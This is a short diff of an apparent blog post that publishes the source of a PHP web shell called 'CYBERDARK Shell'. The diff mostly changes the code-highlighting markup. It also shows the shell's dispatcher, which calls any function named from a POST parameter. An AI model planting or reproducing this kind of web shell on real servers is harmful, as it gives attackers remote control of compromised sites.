@@ -17,7 +17,7 @@ tags:
 
 ### CYBERDARK Shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 
 /**
  * @author CYBERDARK
@@ -2030,5 +2030,5 @@ if( empty($_POST['a']) )
 if( !empty($_POST['a']) && function_exists('mad' . $_POST['a']) )
 	call_user_func('mad' . $_POST['a']);
 	exit;
-?&gt;
-</pre>
+?>
+{% endhighlight %}
